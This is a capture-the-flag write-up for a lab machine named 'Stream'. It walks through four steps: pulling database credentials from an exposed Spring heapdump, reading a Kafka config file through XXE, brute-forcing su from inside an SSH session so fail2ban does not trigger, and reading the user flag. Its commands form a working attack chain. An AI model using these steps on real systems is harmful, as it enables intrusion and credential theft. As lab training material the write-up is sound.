# User Flag — Stream

## 1. Heapdump → ClickHouse creds

The Spring gateway exposes an unauthenticated heapdump. Spring's Hikari pool
keeps the raw username/password as Java Strings next to their setters.

```bash
curl -s -o /tmp/heapdump.hprof http://api.htb-airport.htb/actuator/heapdump
python3 scripts/heap_extract.py /tmp/heapdump.hprof
```

Result:

```
svc_events / <CH_PASS>
```

## 2. In-band XXE → Kafka `server.properties`

The downstream lxml parser resolves `file://` entities **in the document tree**.
The expansion lands in ClickHouse column `partner_feed.flightleg_json.airline`.
Not out-of-band — no listener needed.

```bash
python3 scripts/xxe_read.py \
  --target 10.129.15.255 \
  --file /opt/kafka_2.13-4.3.1/config/server.properties \
  --flight K1 \
  -u svc_events -p "$CH_PASS"
```

Result:

```
user_svc_infra="<KAFKA_PASS>"      ← SSH password for svc-infra
```

## 3. SSH `svc-infra` → local `su` brute

**Do not hydra `:22`** — fail2ban filters the port for ~10 minutes. Log in once
with the Kafka SASL password (single quotes — the secret contains `$`), then
brute `su martin_cole` **from inside** the session.

```bash
# push the pty brute + a short wordlist
head -n 200 /usr/share/wordlists/rockyou.txt > /tmp/ry200.txt
sshpass -p '<KAFKA_PASS>' scp scripts/su_brute.py /tmp/ry200.txt \
  svc-infra@10.129.15.255:/dev/shm/

# run locally on the target
sshpass -p '<KAFKA_PASS>' ssh svc-infra@10.129.15.255 \
  'python3 /dev/shm/su_brute.py martin_cole /dev/shm/ry200.txt'
```

Result:

```
[+] HIT martin_cole : tinkerbell
```

## 4. `user.txt`

```bash
sshpass -p 'tinkerbell' ssh martin_cole@10.129.15.255 'cat ~/user.txt'
```
